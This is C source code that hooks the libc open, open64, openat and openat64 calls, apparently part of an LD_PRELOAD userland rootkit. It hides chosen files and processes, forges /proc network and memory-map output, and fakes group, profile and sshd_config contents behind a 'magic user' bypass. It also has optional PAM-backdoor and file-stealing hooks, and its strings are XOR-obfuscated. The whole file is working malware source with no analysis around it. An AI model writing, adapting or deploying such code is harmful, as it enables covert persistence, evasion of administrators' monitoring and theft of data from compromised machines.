int open(const char *pathname, int flags, mode_t mode){
    hook(COPEN);

    int pidhidden = hidden_pid() || hidden_ppid();

    if(process("ls\0") || pidhidden){
        int gs;
        char *g;

        g = xordup(GROUP_PATH);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0) return fileno(forgegroups(pathname));
        }
    }
    if(pidhidden || magicusr()){
        int gs;
        char *g;

        g = xordup(REAL_PROFILE);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0){
                char *eprofile = xordup(ETC_PROFILE_PATH);
                if(eprofile){
                    int rv = (long)call(COPEN, eprofile, flags, mode);
                    clean(eprofile);
                    return rv;
                }
            }
        }

        char *eprofile = xordup(ETC_PROFILE_PATH);
        if(eprofile){
            gs = strcmp(pathname, eprofile);
            clean(eprofile);
            if(gs == 0) return fileno(forgeprofile(pathname));
        }
    }

    if(magicusr())
        return (long)call(COPEN, pathname, flags, mode);

    if(hidden_path(pathname) && (xprocess(SSH_PROC_NAME) || xprocess(BUSYBOX_PROC_NAME)) && (flags == (64|1|512)))
        if(strcmp(mvbc->preloadpath, pathname) == 0)
            return (long)call(COPEN, "/dev/null", flags, mode);

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

    if(isprocnet(pathname))
        return fileno(forge_procnet(pathname));

#if defined SOFT_PATCH && defined USE_PAM_BD
    char *sshd = xordup(SSHD_CONFIG);
    if(sshd != NULL){
        int ss = strcmp(pathname, sshd);
        clean(sshd);
        if(ss == 0 && sshdproc())
            return fileno(sshdforge(pathname));
    }
#endif

    if(!xfnmatch(MAPS_FULL_PATH, pathname) && procexists(pathname)) return fileno(forge_maps(pathname));
    if(!xfnmatch(SMAPS_FULL_PATH, pathname) && procexists(pathname)) return fileno(forge_smaps(pathname));
    if(!xfnmatch(NMAPS_FULL_PATH, pathname) && procexists(pathname)) return fileno(forge_numamaps(pathname));

    char cwd[PROCPATH_MAX_SIZE];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(!strcmp(cwd, "/proc")){
            if(!xfnmatch(MAPS_PROC_PATH, pathname) && procexists(pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_PROC_PATH, pathname) && procexists(pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_PROC_PATH, pathname) && procexists(pathname)) return fileno(forge_numamaps(pathname));
        }

        if(!xfnmatch(PROCPATH_PATTERN, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname) && procexists(pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_FILENAME, pathname) && procexists(pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_FILENAME, pathname) && procexists(pathname)) return fileno(forge_numamaps(pathname));
        }
    }

#ifdef ENABLE_STEAL
    inspectfile(pathname);
#endif
    return (long)call(COPEN, pathname, flags, mode);
}




int open64(const char *pathname, int flags, mode_t mode){
    hook(COPEN64);

    int pidhidden = hidden_pid() || hidden_ppid();

    if(process("ls\0") || pidhidden){
        int gs;
        char *g;

        g = xordup(GROUP_PATH);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0)
                return fileno(forgegroups(pathname));
        }
    }
    if(pidhidden || magicusr()){
        int gs;
        char *g;

        g = xordup(REAL_PROFILE);
        if(g != NULL){
            gs = strcmp(pathname, g);
            clean(g);
            if(gs == 0){
                char *eprofile = xordup(ETC_PROFILE_PATH);
                if(eprofile){
                    int rv = (long)call(COPEN64, eprofile, flags, mode);
                    clean(eprofile);
                    return rv;
                }
            }
        }

        char *eprofile = xordup(ETC_PROFILE_PATH);
        if(eprofile){
            gs = strcmp(pathname, eprofile);
            clean(eprofile);
            if(gs == 0) return fileno(forgeprofile(pathname));
        }
    }

    if(magicusr())
        return (long)call(COPEN64, pathname, flags, mode);

    if(hidden_path(pathname) && (xprocess(SSH_PROC_NAME) || xprocess(BUSYBOX_PROC_NAME)) && (flags == (64|1|512)))
        if(strcmp(mvbc->preloadpath, pathname) == 0)
            return (long)call(COPEN, "/dev/null", flags, mode);

    if(hidden_path(pathname)){
        errno = ENOENT;
        return -1;
    }

    if(isprocnet(pathname))
        return fileno(forge_procnet(pathname));

#if defined SOFT_PATCH && defined USE_PAM_BD
    char *sshd = xordup(SSHD_CONFIG);
    if(sshd != NULL){
        int ss = strcmp(pathname, sshd);
        clean(sshd);
        if(ss == 0 && sshdproc())
            return fileno(sshdforge(pathname));
    }
#endif

    if(!xfnmatch(MAPS_FULL_PATH, pathname) && procexists(pathname)) return fileno(forge_maps(pathname));
    if(!xfnmatch(SMAPS_FULL_PATH, pathname) && procexists(pathname)) return fileno(forge_smaps(pathname));
    if(!xfnmatch(NMAPS_FULL_PATH, pathname) && procexists(pathname)) return fileno(forge_numamaps(pathname));

    char cwd[PROCPATH_MAX_SIZE];
    if(getcwd(cwd, sizeof(cwd)) != NULL){
        if(strcmp(cwd, "/proc") == 0){
            if(!xfnmatch(MAPS_PROC_PATH, pathname) && procexists(pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_PROC_PATH, pathname) && procexists(pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_PROC_PATH, pathname) && procexists(pathname)) return fileno(forge_numamaps(pathname));
        }

        if(!xfnmatch(PROCPATH_PATTERN, cwd)){
            if(!xfnmatch(MAPS_FILENAME, pathname) && procexists(pathname)) return fileno(forge_maps(pathname));
            if(!xfnmatch(SMAPS_FILENAME, pathname) && procexists(pathname)) return fileno(forge_smaps(pathname));
            if(!xfnmatch(NMAPS_FILENAME, pathname) && procexists(pathname)) return fileno(forge_numamaps(pathname));
        }
    }

#ifdef ENABLE_STEAL
    inspectfile(pathname);
#endif
    return (long)call(COPEN64, pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode){
    hook(COPENAT);
    if(magicusr()) return (long)call(COPENAT, dirfd, pathname, flags, mode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(COPENAT, dirfd, pathname, flags, mode);
}
int openat64(int dirfd, const char *pathname, int flags, mode_t mode){
    hook(COPENAT64);
    if(magicusr()) return (long)call(COPENAT64, dirfd, pathname, flags, mode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(COPENAT64, dirfd, pathname, flags, mode);
}
